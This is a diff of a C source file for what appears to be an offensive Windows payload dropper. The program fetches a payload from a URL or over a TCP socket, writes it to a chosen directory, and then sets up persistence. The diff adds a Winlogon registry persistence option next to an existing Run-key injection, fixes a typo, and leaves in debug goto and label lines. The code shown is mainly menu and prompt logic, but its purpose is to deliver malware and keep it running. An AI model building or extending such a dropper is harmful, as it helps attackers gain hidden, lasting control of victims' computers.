@@ -21,8 +21,6 @@ typedef struct _WRITABLE_DIR {
     char path[MAX_PATH + 1];
 } WRITABLE_DIR, *PWRITABLE_DIR;
 
-static BOOL printHelp = TRUE;
-
 VOID _ListOpts(const char *str, ...) {
     int o=0;
     va_list arg;
@@ -187,10 +185,15 @@ int HandlePersistence(char *opt, void *data) {
 
     switch((char) *opt) {
         case '1':
-            if (!InjectRunRegistry()) {
+            if (!InjectRunRegistry(pPersContext)) {
                 return CONTINUE_ERROR;
             }
-            return SUCCES;
+            return SUCCESS;
+        case '2':
+            if (!InjectWinlogonRegistry(pPersContext)) {
+                return CONTINUE_ERROR;
+            }
+            return SUCCESS;
         default:
             printf("[?] Unknown option specified. Select <h> for available options\n");
             return CONTINUE_ERROR;
@@ -320,15 +323,16 @@ printf("     .    .     .            +         .         .                 .  .\
     	printf("[*] Source to extract payload from: %s\n", source);
         printf("[*] Checking whether resource is accessible\n");
         if (!IsResourceValid(source)) {
-            if (!PromptUntilValid("Continue[y/n]", opt, sizeof(opt), NULL, NULL)) {
+            if (!PromptUntilValid("Continue[y/n]", opt, sizeof(opt), NULL, NULL, FALSE)) {
                 exit(1);
             }
         }
     } else {
         printf("[*] Will be received using TCP socket. Host: %s:%d\n", ip, port);
     }
- 
-    if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL)) {
+    //DOWNLOAD_CONTEXT downloadContext;
+    //goto test;
+    if (!PromptUntilValid("Target Directory", targetDirTmp, MAX_PATH, (ValidatorFunc) &HasWriteAccess, NULL, FALSE)) {
         exit(1); 
     }
     
@@ -348,7 +352,7 @@ printf("     .    .     .            +         .         .                 .  .\
  
     // Check if file exists
     if (FileExists(payloadFull)) {
-        if (!PromptUntilValid("Overwrite[y/n]", opt, sizeof(opt), NULL, NULL)) {
+        if (!PromptUntilValid("Overwrite[y/n]", opt, sizeof(opt), NULL, NULL, FALSE)) {
             exit(1);
         }
     }
@@ -366,7 +370,7 @@ printf("     .    .     .            +         .         .                 .  .\
         downloadContext.sourceUrl = source;
         downloadContext.sourceUrlLen = strlen(source);
         HandleDownload(NULL, NULL);
-        if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext)) {
+        if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandleDownload, (PDOWNLOAD_CONTEXT) &downloadContext, FALSE)) {
             exit(1);
         }
     } else {
@@ -374,7 +378,7 @@ printf("     .    .     .            +         .         .                 .  .\
             exit(1);
         }
     }
-
+test:
     printf("\n\n[*] **PERSISTENCE OPTIONS**\n\n");    
     PERS_CONTEXT persContext = {
         .regKey = NULL,
@@ -387,7 +391,7 @@ printf("     .    .     .            +         .         .                 .  .\
     };
 
     HandlePersistence(NULL, NULL);
-    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandlePersistence, (PPERS_CONTEXT) &persContext)) {
+    if (!PromptUntilValid("Choose an option", opt, sizeof(opt), (ValidatorFunc) &HandlePersistence, (PPERS_CONTEXT) &persContext, FALSE)) {
         exit(1);
     }
 
